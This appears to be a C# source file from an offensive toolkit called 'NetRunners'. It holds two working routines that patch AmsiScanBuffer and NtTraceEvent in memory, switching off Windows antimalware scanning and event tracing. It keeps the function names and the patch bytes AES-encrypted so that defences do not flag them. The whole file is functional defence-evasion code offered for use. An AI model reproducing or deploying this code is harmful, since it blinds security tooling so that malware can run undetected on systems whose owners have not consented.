using System;
using System.Runtime.InteropServices;
using static NetRunners.Data.Delegates;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Patchers
{
    /// <summary>
    /// Contains AMSI binary patching method
    /// </summary>
    public static class Patcher
    {
        public static bool PatchAmsi()
        {
            try
            {
                /*
                    * x64 patch
                    * moves E_INVALIDARG error code to eax, returns
                    * 
                    mov eax, 0x80070057
                    ret

                    * x86 patch
                    * moves E_INVALIDARG error code to eax, return, pop 18 bytes from stack
                    * during my testing, using a ret instruction (c3) instead of c2 0x18 works as well
                    * 
                    mov eax, 0x80070057
                    ret 0x18
                */

                byte[] patch;
                // define patch var using bitness
                patch = (System.Environment.Is64BitProcess) ? 
                    DecryptionAlgorithms.Decryptor.DecryptBytesToBytes_Aes(AmsiPatch, AesKey, AesIV) :          // x64 payload
                    DecryptionAlgorithms.Decryptor.DecryptBytesToBytes_Aes(AmsiPatch86, AesKey, AesIV);         // x86 payload

                //////// AMSISCANBUFFER
                // get amsi.dll pointer
                IntPtr Library = LoadLibraryA(Decrypt(amsidll_Byte));
                if (Library == IntPtr.Zero)
                    throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");
                // get amsiscanbuffer pointer
                IntPtr funcAddress = GetProcAddress(Library, Decrypt(AmsiScanBuffer_Byte));
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // change memory protections
                VirtualProtect(funcAddress, (UIntPtr)3, 0x40, out oldProtect);
                // patch bytes using our payload
                Marshal.Copy(patch, 0, funcAddress, patch.Length);
                // restore memory protection
                VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);

                Console.WriteLine("[+] Successfully Patched AMSI!");
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred while patching AMSI: {e.Message}");
                throw;
            }
        }
        public static bool PatchEtw() // credits: https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch
        {
            try
            {
                /*
                    * x64/x86 patch
                    * returns as soon as NtEventTrace gets called
                    * 
                    ret                 
                 */

                byte[] patch = new byte[] { 0xc3 };

                // get ntdll.dll pointer
                IntPtr Library = LoadLibraryA("ntdll.dll");
                if (Library == IntPtr.Zero)
                    throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");

                // get NtTraceEvent pointer
                IntPtr funcAddress = GetProcAddress(Library, Decrypt(NtTraceEvent_Byte));
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // fix memory protections of NtTraceEvent function
                VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);

                // overwrite function
                Marshal.Copy(patch, 0, funcAddress, patch.Length);

                // restore memory protection of NtTraceEvent
                VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
                Console.WriteLine("[+] Successfully Patched ETW!");
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred while patching ETW: {e.Message}");
                throw;
            }
        }
    }
}
